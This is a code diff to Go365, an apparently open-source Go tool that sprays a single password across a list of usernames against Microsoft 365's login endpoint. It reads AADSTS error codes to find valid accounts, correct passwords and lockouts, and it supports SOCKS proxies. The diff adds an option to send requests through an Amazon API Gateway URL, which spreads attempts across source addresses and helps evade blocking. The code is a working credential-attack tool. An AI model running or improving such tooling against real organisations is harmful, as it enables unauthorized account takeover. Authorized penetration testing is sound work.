@@ -9,7 +9,7 @@ Copyright 2020 Optiv Inc.
 Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
 The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
-This tool is intended to be used by security professionals that are AUTHORIZED to test the domain targeted by this tool. 
+This tool is intended to be used by security professionals that are AUTHORIZED to test the domain targeted by this tool.
 
 needs:
 - Add a pre-test that enumerates the target domain and determines if it is a viable target for this particular endpoint.
@@ -31,24 +31,28 @@ import (
 	"bytes"
 	"flag"
 	"fmt"
-	"github.com/beevik/etree"
-	"github.com/fatih/color"
-	"golang.org/x/net/proxy"
 	"io/ioutil"
 	"log"
+	"math/rand"
 	"net/http"
 	"os"
 	"strings"
 	"time"
-	"math/rand"
+
+	"github.com/beevik/etree"
+	"github.com/fatih/color"
+	"golang.org/x/net/proxy"
+)
+
+var (
+	targetURL = "https://login.microsoftonline.com/rst2.srf" // keep an eye on this url.
 )
 
 const (
-	version   = "0.1"
-	tool      = "Go365"
-	authors   = "h0useh3ad, paveway3, S4R1N"
-	targetURL = "https://login.microsoftonline.com/rst2.srf" // keep an eye on this url.
-	usage     = ` Usage:
+	version = "0.1"
+	tool    = "Go365"
+	authors = "h0useh3ad, paveway3, S4R1N"
+	usage   = ` Usage:
      ./Go365 -ul <userlist> -p <password> -d <domain> [OPTIONS]
  Options:
      -h,            Show this stuff
@@ -63,12 +67,12 @@ const (
      -d <string>            Domain to test
                               (-d testdomain.com)
     
-   Opions:
+   Optional:
      -w <int>              Time to wait between attepmts in seconds. 
                               - Default: 1 second. 5 seconds recommended.
                               (-w 10)
      -o <string>           Output file to write to
-                              - Will overwrite!
+                              - Will append if file exists
                               (-o ./output.out)
      -proxy <string>       Single proxy server to use
                               - IP address and Port separated by a ":"
@@ -79,6 +83,8 @@ const (
                               - Randomly selects a proxy server to use before each request
                               - Has only been tested using SSH SOCKS5 proxies
                               (-proxyfile ./proxyfile.txt)
+     -url <string>          Endpoint to send requests to
+                              - Amazon API Gateway 'Invoke URL'
 
  Examples:
    ./Go365 -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com
@@ -86,6 +92,7 @@ const (
    ./Go365 -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt
    ./Go365 -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -proxy 127.0.0.1:1080
    ./Go365 -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -proxyfile ./proxyfile.txt
+   ./Go365 -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -url https://k62g98dne3.execute-api.us-east-2.amazonaws.com/login
 `
 	banner = `
   ██████         ██████   ██████  ██████
@@ -103,11 +110,11 @@ func wait(wt int) {
 
 func writeOutput(writeFilePath string, writeString string) {
 	f, err := os.OpenFile(writeFilePath, os.O_APPEND|os.O_WRONLY, 0644)
-	l, err := f.WriteString(writeString+"\n")
+	l, err := f.WriteString(writeString + "\n")
 	if err != nil {
-	    fmt.Println(err)
-	    f.Close()
-	    return
+		fmt.Println(err)
+		f.Close()
+		return
 	}
 	_ = l
 }
@@ -134,8 +141,8 @@ func doTheStuff(un string, pw string, prox string) string {
 	    </ps:AuthInfo>
 	    <wsse:Security>
 	    <wsse:UsernameToken wsu:Id="user">
-	        <wsse:Username>`+un+`</wsse:Username>
-	        <wsse:Password>`+pw+`</wsse:Password>
+	        <wsse:Username>` + un + `</wsse:Username>
+	        <wsse:Password>` + pw + `</wsse:Password>
 	    </wsse:UsernameToken>
 	</wsse:Security>
 	    </S:Header>
@@ -161,8 +168,8 @@ func doTheStuff(un string, pw string, prox string) string {
 		}
 		tr := &http.Transport{Dial: dialSOCKSProxy.Dial}
 		client = &http.Client{
-    		Transport: tr,
-    		Timeout: 15 * time.Second,
+			Transport: tr,
+			Timeout:   15 * time.Second,
 		}
 	}
 
@@ -188,7 +195,7 @@ func doTheStuff(un string, pw string, prox string) string {
 
 	x := xmlResponse.FindElement("//psf:text")
 	if x == nil {
-		returnString = color.GreenString("[+] Possible valid login! "+un+" : "+pw)
+		returnString = color.GreenString("[+] Possible valid login! " + un + " : " + pw)
 		return returnString
 	}
 	t := xmlResponse.FindElement("//psf:text")
@@ -197,16 +204,16 @@ func doTheStuff(un string, pw string, prox string) string {
 		os.Exit(0) // no need to continue if the domain isn't found
 	} else {
 		if strings.Contains(t.Text(), "AADSTS50034") {
-			returnString = color.RedString("[-] User not found: "+un)
+			returnString = color.RedString("[-] User not found: " + un)
 		} else {
 			if strings.Contains(t.Text(), "AADSTS50126") {
-				returnString = color.YellowString("[-] Valid user, but invalid password: "+un)
+				returnString = color.YellowString("[-] Valid user, but invalid password: " + un)
 			} else {
 				if strings.Contains(t.Text(), "AADSTS50056") {
-					returnString = color.YellowString("[!] User exists, but unable to determine if the password is correct: "+un)
+					returnString = color.YellowString("[!] User exists, but unable to determine if the password is correct: " + un)
 				} else {
 					if strings.Contains(t.Text(), "AADSTS50053") {
-						returnString = color.MagentaString("[-] Account locked out: "+un)
+						returnString = color.MagentaString("[-] Account locked out: " + un)
 					} //need: add an else here as a catch-all that says "unknown error code" or something
 				}
 			}
@@ -216,39 +223,42 @@ func doTheStuff(un string, pw string, prox string) string {
 }
 
 type flagVars struct {
-	flagHelp			bool
-	flagUsernameFile	string
-	flagDomain			string
-	flagPassword		string
-	flagWaitTime		int
-	flagProxy			string
-	flagProxyFile       string
-	flagOutFilePath		string
-
+	flagHelp         bool
+	flagUsernameFile string
+	flagDomain       string
+	flagPassword     string
+	flagWaitTime     int
+	flagProxy        string
+	flagProxyFile    string
+	flagOutFilePath  string
+	flagTargetURL    string
 }
 
 func flagOptions() *flagVars {
-	flagHelp			:= flag.Bool("h", false, "")
-	flagUsernameFile	:= flag.String("ul", "", "")
-	flagDomain			:= flag.String("d", "", "")
-	flagPassword		:= flag.String("p", "", "")
-	flagWaitTime		:= flag.Int("w", 1, "")
-	flagProxy			:= flag.String("proxy", "", "")
-	flagOutFilePath		:= flag.String("o", "", "")
-	flagProxyFile       := flag.String("proxyfile", "", "")
+	flagHelp := flag.Bool("h", false, "")
+	flagUsernameFile := flag.String("ul", "", "")
+	flagDomain := flag.String("d", "", "")
+	flagPassword := flag.String("p", "", "")
+	flagWaitTime := flag.Int("w", 1, "")
+	flagProxy := flag.String("proxy", "", "")
+	flagOutFilePath := flag.String("o", "", "")
+	flagProxyFile := flag.String("proxyfile", "", "")
+	flagTargetURL := flag.String("url", "", "")
 
 	flag.Parse()
 
-	return &flagVars {
-		flagHelp: *flagHelp,
+	return &flagVars{
+		flagHelp:         *flagHelp,
 		flagUsernameFile: *flagUsernameFile,
-		flagDomain: *flagDomain,
-		flagPassword: *flagPassword,
-		flagWaitTime: *flagWaitTime,
-		flagProxy: *flagProxy,
-		flagProxyFile: *flagProxyFile,
-		flagOutFilePath: *flagOutFilePath}
+		flagDomain:       *flagDomain,
+		flagPassword:     *flagPassword,
+		flagWaitTime:     *flagWaitTime,
+		flagProxy:        *flagProxy,
+		flagProxyFile:    *flagProxyFile,
+		flagOutFilePath:  *flagOutFilePath,
+		flagTargetURL:    *flagTargetURL,
 	}
+}
 
 func main() {
 
@@ -293,7 +303,7 @@ func main() {
 
 	// -d
 	if !(opt.flagDomain == "") {
-		domain = fmt.Sprintf("@"+opt.flagDomain)
+		domain = fmt.Sprintf("@" + opt.flagDomain)
 	} else {
 		fmt.Printf("%s\n", usage)
 		fmt.Println(color.RedString("Must provide a domain. E.g. -d testdomain.com"))
@@ -303,10 +313,10 @@ func main() {
 	// -proxy
 	if opt.flagProxy != "" {
 		proxyListArray = append(proxyListArray, opt.flagProxy)
-		fmt.Println(color.GreenString("[!] Optional proxy settings configured: "+opt.flagProxy))
+		fmt.Println(color.GreenString("[!] Optional proxy settings configured: " + opt.flagProxy))
 
 	} else if !(opt.flagProxyFile == "") {
-		fmt.Println(color.GreenString("[!] Optional proxy file configured: "+opt.flagProxyFile))
+		fmt.Println(color.GreenString("[!] Optional proxy file configured: " + opt.flagProxyFile))
 		proxyList, err := os.Open(opt.flagProxyFile)
 		if err != nil {
 			log.Fatal(err)
@@ -321,22 +331,27 @@ func main() {
 	// -o
 	if !(opt.flagOutFilePath == "") {
 		outFilePath = opt.flagOutFilePath
-		fmt.Println(color.GreenString("[!] Optional output file configured: "+outFilePath))
-	    f, err := os.Create(outFilePath)
-    	if err != nil {
-        	return
-    	}
-    	_ = f
+		fmt.Println(color.GreenString("[!] Optional output file configured: " + outFilePath))
+		f, err := os.OpenFile(outFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+		if err != nil {
+			return
+		}
+		_ = f
+	}
+
+	// -url
+	if !(opt.flagTargetURL == "") {
+		targetURL = opt.flagTargetURL
 	}
 
 	// do the stuff
-	usernameList, err := os.Open(usernameFile)                   //open and load the username file
+	usernameList, err := os.Open(usernameFile) //open and load the username file
 	if err != nil {
 		log.Fatal(err)
 	}
-	defer usernameList.Close()                                   //close the username file
+	defer usernameList.Close() //close the username file
 	usernames := bufio.NewScanner(usernameList)
-	for usernames.Scan() {                                       //iterate through the usernames
+	for usernames.Scan() { //iterate through the usernames
 		user := usernames.Text() + domain
 		result := doTheStuff(user, password, randomProxy(proxyListArray))
 		if !(outFilePath == "") {
@@ -349,7 +364,7 @@ func main() {
 		log.Fatal(err)
 	}
 	if !(outFilePath == "") {
-		fmt.Println(color.GreenString("[!] Output file located at: "+outFilePath))
+		fmt.Println(color.GreenString("[!] Output file located at: " + outFilePath))
 	}
 	os.Exit(0)
 }
